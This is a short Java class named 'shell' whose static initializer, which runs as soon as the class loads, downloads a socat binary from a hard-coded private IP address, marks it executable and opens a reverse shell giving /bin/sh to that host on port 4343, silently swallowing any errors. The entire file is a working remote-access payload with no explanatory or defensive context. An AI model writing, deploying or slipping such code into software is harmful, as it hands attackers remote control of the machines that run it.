import java.io.InputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.net.URL;


public class shell {
    static {
        String url = "http://10.8.104.70:8888/socat";
        String filename = "./socat";
        String cmd = "./socat TCP:10.8.104.70:4343 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane &";
        try {
            InputStream in = new URL(url).openStream();
            Files.copy(in, Paths.get(filename), StandardCopyOption.REPLACE_EXISTING);

            File file = new File(filename);

            if(file.exists()){
              file.setReadable(true);
              file.setExecutable(true);
              file.setWritable(false);
            }

            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            p.waitFor();
        } catch (Exception e) {
        }
    }
}
